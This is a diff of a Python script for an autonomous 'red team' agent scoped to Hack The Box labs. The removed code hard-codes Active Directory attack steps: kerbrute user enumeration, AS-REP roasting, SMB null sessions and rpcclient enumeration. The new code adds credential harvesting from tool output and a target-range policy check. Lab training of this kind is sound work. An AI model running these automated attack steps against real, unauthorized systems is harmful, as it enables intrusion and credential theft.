@@ -1,199 +1,162 @@
-import sys
-import json
-import time
-import re
+#!/usr/bin/env python3
+"""Authorized-lab Red Team agent. Requires --ip in HTB ranges unless ALLOWED_NETWORKS is set."""
+from __future__ import annotations
+
+import argparse
 import logging
+import os
+import re
+import sys
+import time
 from pathlib import Path
 
-# Configuración de logs obligatorios en pantalla
+from core.flags import extract_flags, mission_status
+from core.playbook import LabPlaybook
+from core.policy_engine import evaluate_policy
+from core.state_manager import StateManager
+from utils.smart_executor import SmartCommandExecutor
+
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
-    handlers=[logging.StreamHandler(sys.stdout)]
+    handlers=[logging.StreamHandler(sys.stdout)],
 )
 logger = logging.getLogger("EnterpriseDynamicAgent")
 
-from core.state_manager import StateManager
-from utils.smart_executor import SmartCommandExecutor
-from utils.exploit_matcher import ExploitMatcher
+DOMAIN_RE = re.compile(
+    r"(\b[a-zA-Z0-9-]+\.(?:htb|lab|local|lan|internal)\b)", re.I
+)
 
-class EnterpriseDynamicAgent:
-    def __init__(self, target_ip: str, domain_name: str = None):
-        self.target_ip = target_ip
-        self.domain_name = domain_name  # Si no se pasa, se autodetectará del nmap
-        
-        # 1. Inicializar el gestor de estado y recuperar historial previo
-        self.state_manager = StateManager(target_ip)
-        previous_state = self.state_manager.load_state()
-        self.current_step = previous_state.get("step_count", 0) + 1
-        
-        logger.info(f"[*] [Agente Dinámico] Reanudando sesión para {target_ip}. Paso actual: {self.current_step}")
-        
-        # 2. Inicializadores de ejecución y exploits
-        self.executor = SmartCommandExecutor(timeout_minutes=20, poll_interval=15)
-        self.exploit_matcher = ExploitMatcher(target_ip)
 
-    def check_flags_status(self) -> tuple:
-        """
-        Verifica de forma persistente si las flags user.txt y root.txt ya fueron 
-        encontradas en el historial, en la carpeta de loot o en los outputs.
-        """
-        state = self.state_manager.load_state()
-        history = state.get("history", [])
-        
-        user_found = False
-        root_found = False
+def parse_args():
+    p = argparse.ArgumentParser(description="HTB-scoped red team agent")
+    p.add_argument("ip", nargs="?", help="Target IP (must pass policy)")
+    p.add_argument("--user", help="Assume-breach username")
+    p.add_argument("--password", help="Assume-breach password")
+    p.add_argument("--domain", help="FQDN if already known")
+    p.add_argument("--max-steps", type=int, default=20)
+    p.add_argument("--dry-run", action="store_true")
+    return p.parse_args()
 
-        for h in history:
-            output = h.get("output", "")
-            cmd = h.get("command", "")
-            
-            if "user.txt" in output or "user.txt" in cmd:
-                if len(output.strip()) > 10 and not "No such file" in output:
-                    user_found = True
-            if "root.txt" in output or "root.txt" in cmd:
-                if len(output.strip()) > 10 and not "No such file" in output:
-                    root_found = True
 
-        return user_found, root_found
+def inject_domain(playbook: LabPlaybook, domain: str | None, command: str) -> str:
+    if domain:
+        return command.replace("detected.htb", domain)
+    return command.replace(" -d detected.htb", "").replace("detected.htb/", "/")
 
-    def extract_domain_from_scan(self, scan_content: str):
-        """
-        Intenta extraer automáticamente el nombre de dominio (FQDN) del output de Nmap 
-        analizando los campos de Kerberos, SMB o LDAP.
-        """
-        if self.domain_name:
-            return  # Si ya se definió, no hacer nada
 
-        # Patrones comunes que devuelven los scripts de nmap para el dominio o FQDN
-        match = re.search(r"(\b[a-zA-Z0-9-]+\.(?:local|htb|lan|internal|com|org|net)\b)", scan_content, re.IGNORECASE)
-        if match:
-            self.domain_name = match.group(1).lower()
-            logger.info(f"[+] [Auto-Descubrimiento] Dominio detectado automáticamente: {self.domain_name}")
-            self.state_manager.update_etc_hosts(domain_name=self.domain_name)
+def harvest_creds(state: dict, output: str) -> list:
+    creds = list(state.get("credentials") or [])
+    # nxc success line: [+] domain\\user:pass
+    for m in re.finditer(r"\[\+\]\s+\S+\\([^:\s]+):(\S+)", output):
+        creds.append({"username": m.group(1), "password": m.group(2), "source": "nxc"})
+    return creds
+
+
+def write_flag_files(loot: Path, status: dict) -> None:
+    if status["user_flags"]:
+        (loot / "user.flag").write_text(status["user_flags"][0] + "\n")
+    if status["root_flags"]:
+        (loot / "root.flag").write_text(status["root_flags"][0] + "\n")
+
+
+def main():
+    args = parse_args()
+    target = args.ip or os.getenv("TARGET_IP")
+    if not target:
+        logger.error("Usage: python3 main.py <IP> [--user U --password P]")
+        sys.exit(2)
+
+    if not evaluate_policy(target):
+        logger.error("Target rejected by policy. Export ALLOWED_NETWORKS if this is your lab.")
+        sys.exit(3)
+
+    sm = StateManager(target)
+    state = sm.load_state()
+    if args.user and args.password:
+        state.setdefault("credentials", [])
+        state["credentials"].insert(0, {"username": args.user, "password": args.password, "source": "cli"})
+    if args.domain:
+        state["domain"] = args.domain
+
+    playbook = LabPlaybook(target, sm.state_dir)
+    executor = SmartCommandExecutor(timeout_minutes=12, poll_interval=10)
+    step = state.get("step_count", 0)
+
+    logger.info("=== authorized lab agent target=%s ===", target)
+
+    while step < args.max_steps:
+        step += 1
+        status = mission_status(
+            [h.get("output", "") for h in state.get("history", [])],
+            sm.loot_dir,
+        )
+        if status["complete"]:
+            write_flag_files(sm.loot_dir, status)
+            logger.info("[+] MISSION COMPLETE user=%s root=%s", status["user_flags"], status["root_flags"])
+            sm.save_state(step, {"command": "stop", "output": "flags"}, phase="done", mission_complete=True, extra=status)
+            break
+
+        cmd, phase = playbook.next_action(state)
+        domain = state.get("domain") or args.domain
+        cmd = inject_domain(playbook, domain, cmd)
+
+        if not evaluate_policy(target):
+            logger.error("Policy denied mid-run")
+            break
+
+        logger.info("[*] step %s [%s] %s", step, phase, cmd)
+        if args.dry_run:
+            output = "[dry-run]"
         else:
-            # Fallback dinámico si no encuentra un FQDN claro
-            self.domain_name = f"target-{self.target_ip.replace('.', '-')}.local"
-            logger.warning(f"[!] No se pudo extraer un FQDN claro. Usando dominio genérico: {self.domain_name}")
+            result = executor.execute_with_polling(cmd)
+            output = (result.get("stdout") or "") + "\n" + (result.get("stderr") or "")
 
-    def determine_next_action(self, current_state: dict) -> tuple:
-        """
-        Motor de decisión dinámico y adaptativo según los servicios descubiertos.
-        """
-        history = current_state.get("history", [])
-        executed_commands = [h.get("command", "") for h in history]
+        scan_blob = ""
+        vs = sm.scans_dir / "version_scan.txt"
+        qs = sm.scans_dir / "quick_scan.txt"
+        if vs.exists():
+            scan_blob = vs.read_text(errors="ignore")
+        elif qs.exists():
+            scan_blob = qs.read_text(errors="ignore")
+        m = DOMAIN_RE.search(scan_blob) or DOMAIN_RE.search(output)
+        if m and not state.get("domain"):
+            state["domain"] = m.group(1).lower()
+            sm.update_etc_hosts(state["domain"])
+            logger.info("[+] domain %s", state["domain"])
 
-        # 1. Reconocimiento inicial (Nmap Amplio)
-        scan_path = f"testing/{self.target_ip}/scans/version_scan.txt"
-        if not any("nmap" in cmd for cmd in executed_commands):
-            command = f"nmap -sV -sC -p- -oN {scan_path} {self.target_ip}"
-            return command, "recon"
+        state["credentials"] = harvest_creds(state, output)
+        flags = extract_flags(output)
+        if flags:
+            (sm.loot_dir / f"flags_step_{step}.txt").write_text("\n".join(flags) + "\n")
+            logger.info("[+] candidate flags: %s", flags)
 
-        # Leer escaneo para determinar si es Active Directory o una máquina Linux/Web genérica
-        scan_content = ""
-        if Path(scan_path).exists():
-            with open(scan_path, "r", encoding="utf-8") as f:
-                scan_content = f.read()
-            self.extract_domain_from_scan(scan_content)
+        entry = {"step": step, "command": cmd, "output": output[-8000:], "phase": phase}
+        status = mission_status(
+            [h.get("output", "") for h in state.get("history", [])] + [output],
+            sm.loot_dir,
+        )
+        write_flag_files(sm.loot_dir, status)
+        sm.save_state(
+            step,
+            entry,
+            phase=phase,
+            mission_complete=status["complete"],
+            credentials=state.get("credentials"),
+            extra={"domain": state.get("domain"), **status},
+        )
+        state = sm.load_state()
+        if status["complete"]:
+            logger.info("[+] flags user=%s root=%s", status["user_flags"], status["root_flags"])
+            break
+        if phase == "idle":
+            logger.info("[*] playbook idle — supply --user/--password from enum")
+            break
+        time.sleep(1)
 
-        is_active_directory = "88/tcp" in scan_content or "389/tcp" in scan_content
+    else:
+        logger.warning("[!] max steps reached")
 
-        if is_active_directory:
-            # Flujo dinámico para Active Directory
-            domain = self.domain_name
-
-            # 2. Enumeración de usuarios Kerberos
-            if not any("kerbrute" in cmd for cmd in executed_commands):
-                wordlist = "/usr/share/seclists/Usernames/Names/names.txt"
-                if not Path(wordlist).exists():
-                    wordlist = "/usr/share/wordlists/rockyou.txt"
-                command = f"kerbrute userenum -d {domain} --dc {self.target_ip} {wordlist}"
-                return command, "enumeration"
-
-            # 3. AS-REP Roasting
-            if not any("GetNPUsers.py" in cmd for cmd in executed_commands):
-                loot_path = f"testing/{self.target_ip}/loot/asrep_hashes.txt"
-                command = f"GetNPUsers.py {domain}/ -no-pass -dc-ip {self.target_ip} -outputfile {loot_path}"
-                return command, "exploitation"
-
-            # 4. SMB Enumeration / Null Session
-            if not any("smbclient" in cmd for cmd in executed_commands):
-                command = f"smbclient -N -L //{self.target_ip}"
-                return command, "enumeration"
-
-            # 5. RPC Enumeration
-            if not any("rpcclient" in cmd for cmd in executed_commands):
-                command = f"rpcclient -U '' -N {self.target_ip} -c 'enumdomusers'"
-                return command, "enumeration"
-        else:
-            # Flujo alternativo dinámico para máquinas Linux/Web estándar (Sin Active Directory)
-            if "80/tcp open" in scan_content or "443/tcp open" in scan_content:
-                if not any("gobuster" in cmd for cmd in executed_commands):
-                    wordlist = "/usr/share/wordlists/dirb/common.txt"
-                    command = f"gobuster dir -u http://{self.target_ip} -w {wordlist} -t 50"
-                    return command, "enumeration"
-
-        # 6. Bucle adaptativo general para profundización
-        step_count = len(executed_commands)
-        command = f"echo '[*] Ciclo adaptativo #{step_count}: Analizando vectores alternativos para {self.target_ip}'"
-        return command, "post-exploitation"
-
-    def run_autonomous_loop(self):
-        logger.info("==================================================")
-        logger.info(f"[*] [Iniciando Agente Autónomo Dinámico] Objetivo: {self.target_ip}")
-        logger.info("[*] El agente iterará de forma autónoma hasta capturar las flags.")
-        logger.info("==================================================")
-
-        while True:
-            logger.info(f"\n==================================================")
-            logger.info(f"[*] [Agente Autónomo - Paso Global #{self.current_step}] Evaluando entorno...")
-            logger.info(f"==================================================")
-
-            user_ok, root_ok = self.check_flags_status()
-            if user_ok and root_ok:
-                logger.info("\n[+] ==================================================")
-                logger.info("[+] ¡¡¡ MISIÓN CUMPLIDA AL 100% !!!")
-                logger.info("[+] Se han detectado y confirmado user.txt y root.txt.")
-                logger.info("[+] ==================================================\n")
-                break
-
-            current_state = self.state_manager.load_state()
-            command, phase = self.determine_next_action(current_state)
-            logger.info(f"[*] [Motor Decisión] Ejecutando: {command}")
-
-            exec_result = self.executor.execute_with_polling(command)
-            output = exec_result.get("stdout", "")
-
-            # Si Nmap corrió, disparar el exploit matcher
-            scan_path = f"testing/{self.target_ip}/scans/version_scan.txt"
-            if "nmap" in command and Path(scan_path).exists():
-                with open(scan_path, "r", encoding="utf-8") as f:
-                    scan_content = f.read()
-                self.exploit_matcher.analyze_scan_output(scan_content)
-
-            history_entry = {
-                "step": self.current_step,
-                "command": command,
-                "output": output
-            }
-            
-            self.state_manager.save_state(
-                step=self.current_step,
-                history_entry=history_entry,
-                phase=phase,
-                mission_complete=(user_ok and root_ok)
-            )
-
-            self.current_step += 1
-            time.sleep(3)
-
-        logger.info("[+] [Agente] Operación finalizada con éxito total.")
 
 if __name__ == "__main__":
-    if len(sys.argv) > 1:
-        TARGET_IP = sys.argv[1]
-    else:
-        TARGET_IP = "10.129.9.175"  # IP por defecto de respaldo, modificable por parámetro
-
-    agent = EnterpriseDynamicAgent(target_ip=TARGET_IP)
-    agent.run_autonomous_loop()
+    main()
